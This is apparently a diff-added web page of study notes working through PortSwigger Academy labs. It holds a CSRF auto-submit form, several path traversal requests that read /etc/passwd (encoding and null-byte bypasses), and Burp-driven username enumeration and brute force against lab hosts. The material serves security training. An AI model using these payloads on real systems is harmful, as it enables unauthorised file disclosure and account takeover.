+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#username-enumeration-via-different-responses" class="md-nav__link">
+     Username enumeration via different responses
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#username-enumeration-via-subtly-different-responses" class="md-nav__link">
+     Username enumeration via subtly different responses
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#username-enumeration-via-response-timing" class="md-nav__link">
+     Username enumeration via response timing
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2fa-simple-bypass" class="md-nav__link">
+     2FA simple bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#password-reset-broken-logic" class="md-nav__link">
+     Password reset broken logic
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#websockets" class="md-nav__link">
+    WebSockets
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-cache-poisoning" class="md-nav__link">
+    Web Cache Poisoning
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#insecure-deserialization" class="md-nav__link">
+    Insecure Deserialization
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#information-disclosure" class="md-nav__link">
+    Information Disclosure
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#business-logic-vulnerabilities" class="md-nav__link">
+    Business Logic Vulnerabilities
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-host-header-attacks" class="md-nav__link">
+    HTTP Host Header Attacks
+  </a>
+  
+    <nav class="md-nav" aria-label="HTTP Host Header Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-password-reset-poisoning" class="md-nav__link">
+    Basic Password Reset Poisoning
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oauth-authentication" class="md-nav__link">
+    OAuth Authentication
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+
+<h1 id="portswigger-academy">PortSwigger Academy<a class="headerlink" href="#portswigger-academy" title="Permanent link">&para;</a></h1>
+<p>PortSwigger Academy (<a href="https://portswigger.net/web-security/dashboard">https://portswigger.net/web-security/dashboard</a>) is a collection of training materials (reading &amp; videos) combined with hands-on-labs designed to help you learn how to "secure the web one step at a time". It covers a number of the most common vulnerabilities, helping you understand them, understand how to exploit them, and how they can be prevented. Best of all, they are all free. The tools <em>are</em> designed to work with/be supported by PortSwigger's flagship product, Burp Suite Professional, but you can utilize any number of other tools (curl/browsers/ZAP/etc). At the time I worked through these, I did not have access to a professional license, so I used the Burp Suite Community edition (free). Below are my notes written as I worked through the various challenges. </p>
+<h2 id="topics">Topics<a class="headerlink" href="#topics" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="/ctf/ps-accesscontrol.html">Access Control</a></li>
+<li><a href="/ctf/ps-xss.html">Cross-Site Scripting</a></li>
+<li><a href="/ctf/ps-oscmdi.html">OS Command Injection</a></li>
+<li><a href="/ctf/ps-sqi.html">SQL Injection</a></li>
+</ul>
+<h2 id="cross-site-request-forgery-csrf">Cross-site Request Forgery (CSRF)<a class="headerlink" href="#cross-site-request-forgery-csrf" title="Permanent link">&para;</a></h2>
+<h3 id="csrf-vulnerability-with-no-defenses">CSRF vulnerability with no defenses<a class="headerlink" href="#csrf-vulnerability-with-no-defenses" title="Permanent link">&para;</a></h3>
+<div class="admonition question">
+<p class="admonition-title">Question</p>
+<p>This lab's email change functionality is vulnerable to CSRF.</p>
+<p>To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</div>
+<p>This first one was easy... following the instructions in the documentation on CSRF, you simply craft an evil payload something similar to the following:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://acbd1fc91ebd63dfc0dc1e3100420089.web-security-academy.net/my-account/change-email&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;pwned@evil-user.net&quot;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="w"></span>
+<span class="w">      </span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+<h2 id="clickjacking">Clickjacking<a class="headerlink" href="#clickjacking" title="Permanent link">&para;</a></h2>
+<h2 id="dom-based-vulnerabilities">DOM-based Vulnerabilities<a class="headerlink" href="#dom-based-vulnerabilities" title="Permanent link">&para;</a></h2>
+<h2 id="cross-origin-resource-sharing-cors">Cross-Origin Resource Sharing (CORS)<a class="headerlink" href="#cross-origin-resource-sharing-cors" title="Permanent link">&para;</a></h2>
+<h2 id="xml-external-entity-xxe-injection">XML External Entity (XXE) injection<a class="headerlink" href="#xml-external-entity-xxe-injection" title="Permanent link">&para;</a></h2>
+<h2 id="server-side-request-forgery-ssrf">Server-Side Request Forgery (SSRF)<a class="headerlink" href="#server-side-request-forgery-ssrf" title="Permanent link">&para;</a></h2>
+<h2 id="http-request-smuggling">HTTP Request Smuggling<a class="headerlink" href="#http-request-smuggling" title="Permanent link">&para;</a></h2>
+<h2 id="server-side-template-injection">Server-Side Template Injection<a class="headerlink" href="#server-side-template-injection" title="Permanent link">&para;</a></h2>
+<h2 id="directory-traversal">Directory Traversal<a class="headerlink" href="#directory-traversal" title="Permanent link">&para;</a></h2>
+<h3 id="file-path-traversal-simple-case"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a10 10 0 0 1 10 10 10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2m0 2a8 8 0 0 0-8 8c0 2.4 1 4.5 2.7 6 1.4-1.3 3.3-2 5.3-2s3.8.7 5.3 2c1.7-1.5 2.7-3.6 2.7-6a8 8 0 0 0-8-8m2 2a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1m-4 0a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1M6.91 8.94c.13 0 .25.03.39.06l3.2 1.32.27.11c.56-.43 1.32-.55 1.98-.28 1.02.41 1.52 1.58 1.1 2.6a1.992 1.992 0 0 1-2.6 1.1c-.66-.26-1.13-.85-1.25-1.57l-.23-.1-3.22-1.3-.02-.01c-.53-.21-.76-.79-.56-1.31a1 1 0 0 1 .94-.62M17 9a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1Z"/></svg></span> File path traversal, simple case<a class="headerlink" href="#file-path-traversal-simple-case" title="Permanent link">&para;</a></h3>
+<div class="admonition question">
+<p class="admonition-title">Question</p>
+<p>This lab contains a file path traversal vulnerability in the display of product images.</p>
+<p>To solve the lab, retrieve the contents of the <code>/etc/passwd</code> file.</p>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>I tried to solve this using just a browser, but was unsuccessful. Primarily because the content type of the return is <code>image/jpeg</code> and since I'm pulling text (the <code>/etc/passwd</code> file), it simply doesn't render properly in the chrome developer tools. NTS: use the tool.</p>
+</div>
+<p>Poking around a bit and found that the site dynamically loads images using the following structure:</p>
+<div class="highlight"><pre><span></span><code>https://ac101fa61fd2a9cdc02e17a800950081.web-security-academy.net/image?filename=37.jpg
+</code></pre></div>
+<p>I simply found this request in the Burp Suite proxy, forwarded it to the repeater tool and edited the <code>filename</code> parameter to be <code>image?filename=../../../etc/passwd</code> and then sent the request. The response looked like the following:</p>
+<div class="highlight"><pre><span></span><code>HTTP/1.1 200 OK
+Content-Type: image/jpeg
+Connection: close
+Content-Length: 1260
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+peter:x:12001:12001::/home/peter:/bin/bash
+carlos:x:12002:12002::/home/carlos:/bin/bash
+user:x:12000:12000::/home/user:/bin/bash
+elmer:x:12099:12099::/home/elmer:/bin/bash
+academy:x:10000:10000::/home/academy:/bin/bash
+dnsmasq:x:101:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+messagebus:x:102:101::/nonexistent:/usr/sbin/nologin
+</code></pre></div>
+<h3 id="file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2m0 2a8 8 0 0 1 8 8c0 2.4-1 4.5-2.7 6-1.4-1.3-3.3-2-5.3-2s-3.8.7-5.3 2C5 16.5 4 14.4 4 12a8 8 0 0 1 8-8m2 1.89c-.38.01-.74.26-.9.65l-1.29 3.23-.1.23c-.71.13-1.3.6-1.57 1.26-.41 1.03.09 2.19 1.12 2.6 1.03.41 2.19-.09 2.6-1.12.26-.66.14-1.42-.29-1.98l.1-.26 1.29-3.21.01-.03c.2-.51-.05-1.09-.56-1.3-.13-.05-.26-.07-.41-.07M10 6a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1M7 9a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1m10 0a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1Z"/></svg></span> File path traversal, traversal sequences blocked with absolute path bypass<a class="headerlink" href="#file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass" title="Permanent link">&para;</a></h3>
+<div class="admonition question">
+<p class="admonition-title">Question</p>
+<p>This lab contains a file path traversal vulnerability in the display of product images.</p>
+<p>The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.</p>
+<p>To solve the lab, retrieve the contents of the <code>/etc/passwd</code> file.</p>
+</div>
+<p>This one was pretty easy. Given a request like the following:</p>
+<div class="highlight"><pre><span></span><code>GET /image?filename=48.jpg HTTP/1.1
+</code></pre></div>
+<p>I confirmed that it didn't work the "easy way" by testing this:</p>
+<div class="highlight"><pre><span></span><code>GET /image?filename=../../../etc/passwd HTTP/1.1
+</code></pre></div>
+<p>And received an error indicating the requested file did not exist. So, following the instructions, I adjusted the request as follows:</p>
+<div class="highlight"><pre><span></span><code>GET /image?filename=/etc/passwd HTTP/1.1
+</code></pre></div>
+<p>And was rewarded with the contents of the <code>/etc/passwd</code> file.</p>
+<h3 id="file-path-traversal-traversal-sequences-stripped-non-recursively"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2m0 2a8 8 0 0 1 8 8c0 2.4-1 4.5-2.7 6-1.4-1.3-3.3-2-5.3-2s-3.8.7-5.3 2C5 16.5 4 14.4 4 12a8 8 0 0 1 8-8m2 1.89c-.38.01-.74.26-.9.65l-1.29 3.23-.1.23c-.71.13-1.3.6-1.57 1.26-.41 1.03.09 2.19 1.12 2.6 1.03.41 2.19-.09 2.6-1.12.26-.66.14-1.42-.29-1.98l.1-.26 1.29-3.21.01-.03c.2-.51-.05-1.09-.56-1.3-.13-.05-.26-.07-.41-.07M10 6a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1M7 9a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1m10 0a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1Z"/></svg></span> File path traversal, traversal sequences stripped non-recursively<a class="headerlink" href="#file-path-traversal-traversal-sequences-stripped-non-recursively" title="Permanent link">&para;</a></h3>
+<div class="admonition question">
+<p class="admonition-title">Question</p>
+<p>This lab contains a file path traversal vulnerability in the display of product images.</p>
+<p>The application strips path traversal sequences from the user-supplied filename before using it.</p>
+<p>To solve the lab, retrieve the contents of the <code>/etc/passwd</code> file.</p>
+</div>
+<p>The key to solving this lab is that the server-side code appears to be looking for instances of <code>../</code> and stripping them, but <em>non-recursively</em>. This means, that they might have a line that looks like the following bit of python:</p>
+<div class="highlight"><pre><span></span><code><span class="n">safe_path</span> <span class="o">=</span> <span class="n">requested_path</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;../&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+</code></pre></div>
+<p>If you provide a request that looks like this: <code>/image?filename=....//....//....//etc/passwd</code>, the value of <code>safe_path</code> still has a traversal problem, which means we will still get the file we are looking for which, is in fact, the case here.</p>
+<h3 id="file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2m0 2a8 8 0 0 1 8 8c0 2.4-1 4.5-2.7 6-1.4-1.3-3.3-2-5.3-2s-3.8.7-5.3 2C5 16.5 4 14.4 4 12a8 8 0 0 1 8-8m2 1.89c-.38.01-.74.26-.9.65l-1.29 3.23-.1.23c-.71.13-1.3.6-1.57 1.26-.41 1.03.09 2.19 1.12 2.6 1.03.41 2.19-.09 2.6-1.12.26-.66.14-1.42-.29-1.98l.1-.26 1.29-3.21.01-.03c.2-.51-.05-1.09-.56-1.3-.13-.05-.26-.07-.41-.07M10 6a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1M7 9a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1m10 0a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1Z"/></svg></span> File path traversal, traversal sequences stripped with superfluous URL-decode<a class="headerlink" href="#file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode" title="Permanent link">&para;</a></h3>
+<div class="admonition question">
+<p class="admonition-title">Question</p>
+<p>This lab contains a file path traversal vulnerability in the display of product images.</p>
+<p>The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.</p>
+<p>To solve the lab, retrieve the contents of the <code>/etc/passwd</code> file.</p>
+</div>
+<p>On this one, I tried URL-encoding the traversal attack as follows:</p>
+<div class="highlight"><pre><span></span><code>GET /image?filename=%2E%2E%2f%2E%2E%2f%2E%2E%2fetc%2fpasswd HTTP/1.1
+</code></pre></div>
+<p>You see that each <code>.</code> becomes <code>%2e</code> and each <code>/</code> becomes <code>%2f</code>. But this didn't work. I then tried <em>double</em> URL encoding the path as shown below, which <strong>did</strong> work.</p>
+<div class="highlight"><pre><span></span><code>GET /image?filename=%252E%252E%252f%252E%252E%252f%252E%252E%252fetc%252fpasswd HTTP/1.1
+</code></pre></div>
+<p>The problem or <em>bug</em> in this application is that they called a "safe" function (URL-decode) twice... once prior to checking for path traversal issues (a good thing) but a second time <em>after</em> checking for path traversal issues. This could almost be considered a TOCTOU type bug.</p>
+<h3 id="file-path-traversal-validation-of-start-of-path"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2m0 2a8 8 0 0 1 8 8c0 2.4-1 4.5-2.7 6-1.4-1.3-3.3-2-5.3-2s-3.8.7-5.3 2C5 16.5 4 14.4 4 12a8 8 0 0 1 8-8m2 1.89c-.38.01-.74.26-.9.65l-1.29 3.23-.1.23c-.71.13-1.3.6-1.57 1.26-.41 1.03.09 2.19 1.12 2.6 1.03.41 2.19-.09 2.6-1.12.26-.66.14-1.42-.29-1.98l.1-.26 1.29-3.21.01-.03c.2-.51-.05-1.09-.56-1.3-.13-.05-.26-.07-.41-.07M10 6a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1M7 9a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1m10 0a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1Z"/></svg></span> File path traversal, validation of start of path<a class="headerlink" href="#file-path-traversal-validation-of-start-of-path" title="Permanent link">&para;</a></h3>
+<div class="admonition question">
+<p class="admonition-title">Question</p>
+<p>This lab contains a file path traversal vulnerability in the display of product images.</p>
+<p>The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.</p>
+<p>To solve the lab, retrieve the contents of the <code>/etc/passwd</code> file.</p>
+</div>
+<p>Within the HTTP request log, I found a request that looks like this:</p>
+<div class="highlight"><pre><span></span><code>GET /image?filename=/var/www/images/47.jpg HTTP/1.1
+</code></pre></div>
+<p>I modified it as follows:</p>
+<div class="highlight"><pre><span></span><code>GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
+</code></pre></div>
+<p>After submission, I was presented the <code>/etc/passwd</code> file.</p>
+<h3 id="file-path-traversal-validation-of-file-extension-with-null-byte-bypass"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2m0 2a8 8 0 0 1 8 8c0 2.4-1 4.5-2.7 6-1.4-1.3-3.3-2-5.3-2s-3.8.7-5.3 2C5 16.5 4 14.4 4 12a8 8 0 0 1 8-8m2 1.89c-.38.01-.74.26-.9.65l-1.29 3.23-.1.23c-.71.13-1.3.6-1.57 1.26-.41 1.03.09 2.19 1.12 2.6 1.03.41 2.19-.09 2.6-1.12.26-.66.14-1.42-.29-1.98l.1-.26 1.29-3.21.01-.03c.2-.51-.05-1.09-.56-1.3-.13-.05-.26-.07-.41-.07M10 6a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1M7 9a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1m10 0a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1Z"/></svg></span> File path traversal, validation of file extension with null byte bypass<a class="headerlink" href="#file-path-traversal-validation-of-file-extension-with-null-byte-bypass" title="Permanent link">&para;</a></h3>
+<div class="admonition question">
+<p class="admonition-title">Question</p>
+<p>This lab contains a file path traversal vulnerability in the display of product images.</p>
+<p>The application validates that the supplied filename ends with the expected file extension.</p>
+<p>To solve the lab, retrieve the contents of the <code>/etc/passwd</code> file.</p>
+</div>
+<p>If you take the time to <a href="https://portswigger.net/web-security/file-path-traversal">read the documentation</a> on this type of issue, the solution becomes quite straight forward. The following <code>GET</code> request does the trick:</p>
+<div class="highlight"><pre><span></span><code>GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
+</code></pre></div>
+<h2 id="authentication">Authentication<a class="headerlink" href="#authentication" title="Permanent link">&para;</a></h2>
+<h3 id="username-enumeration-via-different-responses"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a10 10 0 0 1 10 10 10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2m0 2a8 8 0 0 0-8 8c0 2.4 1 4.5 2.7 6 1.4-1.3 3.3-2 5.3-2s3.8.7 5.3 2c1.7-1.5 2.7-3.6 2.7-6a8 8 0 0 0-8-8m2 2a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1m-4 0a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1M6.91 8.94c.13 0 .25.03.39.06l3.2 1.32.27.11c.56-.43 1.32-.55 1.98-.28 1.02.41 1.52 1.58 1.1 2.6a1.992 1.992 0 0 1-2.6 1.1c-.66-.26-1.13-.85-1.25-1.57l-.23-.1-3.22-1.3-.02-.01c-.53-.21-.76-.79-.56-1.31a1 1 0 0 1 .94-.62M17 9a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1Z"/></svg></span> Username enumeration via different responses<a class="headerlink" href="#username-enumeration-via-different-responses" title="Permanent link">&para;</a></h3>
+<div class="admonition question">
+<p class="admonition-title">Question</p>
+<p>This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:</p>
+<p>Candidate usernames
+Candidate passwords</p>
+<p>To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.</p>
+</div>
+<p>Goal: Enumerate a valid username, brute-force the user's password, and then access the user's account page.</p>
+<p>You are provided a wordlist of candidate usernames as well as a list of candidate passwords.</p>
+<p>Here are the steps I took to solve this challenge:</p>
+<ol>
+<li>Load up Burp and start the embedded browser</li>
+<li>Connect to the URL provided and visit the <code>/login</code> page</li>
+<li>Attempt to log in with a random username/password</li>
+<li>View the <code>POST</code> request in Burp and send it to the intruder</li>
+<li>On the Positions tab, I cleared the <code>§</code> from the session cookie, leaving just the username and password positions</li>
+<li>Pasted the values from the list of candidate usernames (100 of them) into the Payload Options (simple list) and started the attack, paying attention to the response payload size.</li>
+<li>After the list ran through, I sorted by response length and noticed that one of them (username: <code>agenda</code>) had a different payload length. Looking at the response text, I noticed that it said <em>"Incorrect password"</em>. </li>
+<li>Returning to the positions page, I changed the username to a static value of <code>agenda</code></li>
+<li>I cleared the payload list and pasted in the values from the candidate password list and then ran the attack</li>
+<li>Watching the response lengths, I again noticed taht one of them (password: <code>robert</code>) had a different length. Inspecting the response showed that user had logged in. </li>
+<li>With this information, I then returned to the browser, manually logged in with this information, and completed the challenge</li>
+</ol>
+<h3 id="username-enumeration-via-subtly-different-responses"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2m0 2a8 8 0 0 1 8 8c0 2.4-1 4.5-2.7 6-1.4-1.3-3.3-2-5.3-2s-3.8.7-5.3 2C5 16.5 4 14.4 4 12a8 8 0 0 1 8-8m2 1.89c-.38.01-.74.26-.9.65l-1.29 3.23-.1.23c-.71.13-1.3.6-1.57 1.26-.41 1.03.09 2.19 1.12 2.6 1.03.41 2.19-.09 2.6-1.12.26-.66.14-1.42-.29-1.98l.1-.26 1.29-3.21.01-.03c.2-.51-.05-1.09-.56-1.3-.13-.05-.26-.07-.41-.07M10 6a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1M7 9a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1m10 0a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1Z"/></svg></span> Username enumeration via subtly different responses<a class="headerlink" href="#username-enumeration-via-subtly-different-responses" title="Permanent link">&para;</a></h3>
+<div class="admonition question">
+<p class="admonition-title">Question</p>
+<p>This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:</p>
+<p>Candidate usernames
+Candidate passwords</p>
+<p>To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.</p>
+</div>
+<p>Working on this challenge made me sharpen my understanding of the <em>intruder</em> tool. I had two lists, and I wanted to run all permutations of them (combined). The mistake I had been making was that I had been failing to change the attack type from the default <code>Sniper</code> to the <code>Cluster Bomb</code> option. This let me define my two lists, each assigned to one of the two fields/positions, and then start.</p>
+<p>After just over 10,000 attempts, we found one request that returned a <code>302</code> rather than a <code>200</code>. Logging in as <code>at</code> with a password of <code>7777777</code> solved the challenge.</p>
+<h3 id="username-enumeration-via-response-timing"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2m0 2a8 8 0 0 1 8 8c0 2.4-1 4.5-2.7 6-1.4-1.3-3.3-2-5.3-2s-3.8.7-5.3 2C5 16.5 4 14.4 4 12a8 8 0 0 1 8-8m2 1.89c-.38.01-.74.26-.9.65l-1.29 3.23-.1.23c-.71.13-1.3.6-1.57 1.26-.41 1.03.09 2.19 1.12 2.6 1.03.41 2.19-.09 2.6-1.12.26-.66.14-1.42-.29-1.98l.1-.26 1.29-3.21.01-.03c.2-.51-.05-1.09-.56-1.3-.13-.05-.26-.07-.41-.07M10 6a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1M7 9a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1m10 0a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1Z"/></svg></span> Username enumeration via response timing<a class="headerlink" href="#username-enumeration-via-response-timing" title="Permanent link">&para;</a></h3>
+<div class="admonition question">
+<p class="admonition-title">Question</p>
+<p>This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.</p>
+<p>Your credentials: wiener:peter
+Candidate usernames
+Candidate passwords</p>
+</div>
+<p>This was an unwelcome response:</p>
+<div class="admonition error">
+<p class="admonition-title">Error</p>
+<p>You have made too many incorrect login attempts. Please try again in 30 minute(s).</p>
+</div>
+<p>The more accurate statement... I should have read the instructions. You are supposed to do this in two steps: 1. enumerate the username and then 2. brute force that user's password. I tried to just do the cluster bomb approach and that was foolish.</p>
+<h3 id="2fa-simple-bypass"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a10 10 0 0 1 10 10 10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2m0 2a8 8 0 0 0-8 8c0 2.4 1 4.5 2.7 6 1.4-1.3 3.3-2 5.3-2s3.8.7 5.3 2c1.7-1.5 2.7-3.6 2.7-6a8 8 0 0 0-8-8m2 2a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1m-4 0a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1M6.91 8.94c.13 0 .25.03.39.06l3.2 1.32.27.11c.56-.43 1.32-.55 1.98-.28 1.02.41 1.52 1.58 1.1 2.6a1.992 1.992 0 0 1-2.6 1.1c-.66-.26-1.13-.85-1.25-1.57l-.23-.1-3.22-1.3-.02-.01c-.53-.21-.76-.79-.56-1.31a1 1 0 0 1 .94-.62M17 9a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1Z"/></svg></span> 2FA simple bypass<a class="headerlink" href="#2fa-simple-bypass" title="Permanent link">&para;</a></h3>
+<div class="admonition question">
+<p class="admonition-title">Question</p>
+<p>This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.</p>
+<p>Your credentials: <code>wiener:peter</code>
+Victim's credentials <code>carlos:montoya</code></p>
+</div>
